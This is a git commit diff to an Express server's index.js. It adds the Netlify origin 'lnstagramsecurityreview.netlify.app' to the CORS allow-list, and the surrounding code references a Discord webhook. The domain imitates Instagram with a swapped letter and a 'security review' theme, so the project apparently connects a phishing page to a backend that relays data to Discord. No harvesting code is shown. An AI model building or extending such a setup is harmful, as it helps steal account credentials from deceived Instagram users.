31bd8e69a8aaf42bfcd7df3e4442c240c9012402
Achyuth <achyyuthh@gmail.com>
2025-11-05 22:36:13 +0530

    Add Netlify URL to CORS

--- index.js
+++ index.js
@@ -15,7 +15,11 @@ if (!DISCORD_WEBHOOK) {
 
 // Allow requests from your local page(s)
 app.use(cors({
-  origin: ['http://127.0.0.1:5500', 'http://localhost:5500'],
+  origin: [
+    "http://127.0.0.1:5500",
+    "http://localhost:5500",
+    "https://lnstagramsecurityreview.netlify.app/"
+  ],
   credentials: true
 }));
 
